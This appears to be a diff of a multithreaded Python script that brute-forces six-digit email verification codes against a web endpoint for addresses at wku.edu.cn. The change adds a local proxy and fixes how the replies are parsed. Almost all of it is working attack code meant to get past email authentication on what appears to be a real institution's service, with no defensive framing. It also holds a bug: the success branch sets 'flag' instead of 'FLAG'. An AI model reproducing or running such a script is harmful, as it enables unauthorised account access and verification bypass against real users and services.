@@ -27,7 +27,7 @@ header = {
 }
 
 threadpool = []
-flag = False
+FLAG = False
 class bruteForce(threading.Thread):
     def __init__(self, threadId, name, range_:list):
         threading.Thread.__init__(self)
@@ -39,9 +39,9 @@ class bruteForce(threading.Thread):
         s = requests.session()
         s.keep_alive = False
         for num in range(self.range_[0], self.range_[1]):
-            if flag: break
+            if FLAG: break
             payload = f'userId={userId}&code={num:06d}&email={email}%40wku.edu.cn'
-            req = s.post(base_url, headers=header, data=payload, verify=False)
+            req = s.post(base_url, headers=header, data=payload, verify=False, proxies={'https':'127.0.0.1:41091'})
             ob = json.loads(req.content.decode(encoding='utf-8'))
 
             if num % 1000 == 0:
@@ -49,10 +49,10 @@ class bruteForce(threading.Thread):
 
             if ob['msg'] != 'Wrong code.':
                 print(ob['msg'],num)
-                if ob['msg'].contains('blank'):
-                    print('Time out, try again')
+                if 'blank' in ob['msg']:
+                    print('Time out or Validation not started, try again')
                     break
-                elif ob['msg'].contains('OK'):
+                elif 'OK' in ob['msg']:
                     print('EMAIL AUTH PASSED: '+ f'{num:06d}')
                     flag = True
                     break
